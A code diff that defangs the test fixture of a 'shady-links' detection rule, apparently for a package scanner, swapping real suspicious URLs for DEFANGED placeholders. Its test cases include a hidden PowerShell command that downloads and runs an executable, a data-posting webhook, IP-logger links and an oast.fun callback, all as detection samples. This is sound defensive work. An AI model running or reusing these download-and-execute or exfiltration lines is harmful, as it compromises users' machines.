@@ -26,7 +26,7 @@ def f():
 
 def f():
   # ok: shady-links
-  goodlink3 = "http://xn--n3h.net//"
+  goodlink3 = "http://DEFANGED.net//"
 
 def f():
   # ok: shady-links
@@ -40,13 +40,13 @@ def f():
 """
 def f():
   # ok: shady-links
-  "https://lov.linkeddata.es/dataset/lov/api/v2/vocabulary/autocomplete?q=%s'%vocab"
+  "https://lov.linkeddata.es/dataset/DEFANGED?q=%s'%vocab"
 
 def f():
   """
   How about links in long comments?
   # ok: shady-links
-  ref:http://bit.ly/2gK6bXK
+  ref:http://bit.ly/DEFANGED
   """
 
 """ OK: urls nested within data structures, comments, etc.
@@ -71,7 +71,7 @@ def f():
 def f():
   os.system(
       # ruleid: shady-links
-      "powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'"
+      "powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/DEFANGED',$env:APPDATA+'\foo.exe'); Start-Process $env:APPDATA'\foo.exe'"
   )
 
 
@@ -79,7 +79,7 @@ def f():
 """
 def f():
   # ruleid: shady-links
-  req = urllib3.Request("https://grabify.link/E09EIF", headers={"User-Agent": os})
+  req = urllib3.Request("https://grabify.link/DEFANGED", headers={"User-Agent": os})
 
 """ RULEID: IPv4
 """
@@ -93,11 +93,11 @@ def f():
 
 def f():
   # ruleid: shady-links
-  req = urllib3.Request("https://root@12.34.56.78:42", headers={"User-Agent": os})
+  req = urllib3.Request("https://root@128.0.0.1:42", headers={"User-Agent": os})
 
 def f():
   # ruleid: shady-links
-  req = urllib3.Request("https://root@123.234.156.178", headers={"User-Agent": os})
+  req = urllib3.Request("https://root@128.0.0.1", headers={"User-Agent": os})
 
 def f():
   # ruleid: shady-links
@@ -144,7 +144,7 @@ def f():
 def f():
   request(
       # ruleid: shady-links
-      url="http://us.dslab.pw/webhook.php",
+      url="http://us.DEFANGED.pw/DEFANGED",
       method="POST",
       data=json.dumps(data).encode("utf-8", errors="ignore"),
       headers=headers,
@@ -167,15 +167,15 @@ def f():
 
   def f():
     # ruleid: shady-links
-    trackingServiceUrl = 'https://b.alt-h7-eoj8gqk1.workers.dev/track'
+    trackingServiceUrl = 'https://DEFANGED.workers.dev/track'
 
 def f():
     # ok: shady-links
-    trackingServiceUrl = 'https//discord.com/invite/u9zUjWbbQ'
+    trackingServiceUrl = 'https//discord.com/invite/DEFANGED'
 
 def f():
     # ruleid: shady-links
-    trackingUrl = "qkrfaniquihoswritqaqwbg5r4l072qp7.oast.fun/track"
+    trackingUrl = "DEFANGED.oast.fun/DEFANGED"
 
 def f():
     # ok: shady-links
